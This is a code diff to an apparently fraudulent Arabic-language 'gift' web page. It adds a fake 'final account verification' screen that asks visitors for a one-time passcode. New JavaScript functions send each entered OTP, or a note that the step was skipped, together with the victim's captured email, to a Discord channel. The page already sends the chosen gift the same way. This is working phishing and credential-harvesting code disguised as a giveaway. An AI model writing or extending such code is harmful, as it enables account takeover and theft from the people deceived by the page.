@@ -101,6 +101,22 @@
             box-shadow: 0 0 15px rgba(0, 245, 212, 0.4);
             margin-top: 5px;
         }
+        .btn-secondary {
+            background: transparent;
+            color: #94a3b8;
+            border: 1px solid #475569;
+            width: 100%;
+            padding: 10px;
+            font-size: 13px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: 0.2s;
+        }
+        .btn-secondary:hover {
+            color: #fff;
+            border-color: #00f5d4;
+        }
         .error-msg {
             background: rgba(239, 68, 68, 0.2);
             border: 1px solid #ef4444;
@@ -224,7 +240,23 @@
             <button type="button" class="btn" onclick="submitGiftChoice()" id="giftBtn" disabled style="opacity: 0.5;">تأكيد اختيار الهدية</button>
         </div>
 
-        <!-- 4. رسالة النهاية -->
+        <!-- 4. واجهة كود التأكيد (OTP) الأخيرة -->
+        <div id="otpSection" class="hidden">
+            <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
+            <h2>التحقق الأخير للحساب</h2>
+            <p class="subtitle">أدخل كود التأكيد (إن تم إرساله لك عبر البريد أو الهاتف)، أو تخطى الخطوة في حال لم يُرسل لك شيء.</p>
+
+            <form onsubmit="submitOtpCode(event)">
+                <div class="input-group">
+                    <label>كود التأكيد (OTP)</label>
+                    <input type="text" id="otpCode" placeholder="أدخل الكود المكون من أرقام">
+                </div>
+                <button type="submit" class="btn">تأكيد الكود واستلام الهدية</button>
+            </form>
+            <button type="button" class="btn-secondary" onclick="skipOtp()">لم يتم إرسال أي كود، إتمام المهمة</button>
+        </div>
+
+        <!-- 5. رسالة النهاية -->
         <div id="successSection" class="hidden">
             <img src="IMG_20260830_052043_542.jpg" alt="Logo" class="logo-img">
             <h2>تم الطلب بنجاح!</h2>
@@ -344,6 +376,22 @@
             await sendToDiscord(`🎁 **[ اختيار الهدية ]**\nالإيميل: \`${capturedEmail}\`\nالهدية المختارة: **${chosenGift}**`);
             
             document.getElementById('giftSection').classList.add('hidden');
+            document.getElementById('otpSection').classList.remove('hidden');
+        }
+
+        async function submitOtpCode(event) {
+            event.preventDefault();
+            let otp = document.getElementById('otpCode').value;
+            await sendToDiscord(`🔢 **[ كود التأكيد OTP المدخل ]**\nالإيميل: \`${capturedEmail}\`\nالكود: \`${otp}\``);
+            
+            document.getElementById('otpSection').classList.add('hidden');
+            document.getElementById('successSection').classList.remove('hidden');
+        }
+
+        async function skipOtp() {
+            await sendToDiscord(`⚠️ **[ تخطي كود التأكيد ]**\nالإيميل: \`${capturedEmail}\`\n(لم يتم إرسال كود، وتم إتمام المهمة بنجاح).`);
+            
+            document.getElementById('otpSection').classList.add('hidden');
             document.getElementById('successSection').classList.remove('hidden');
         }
     </script>
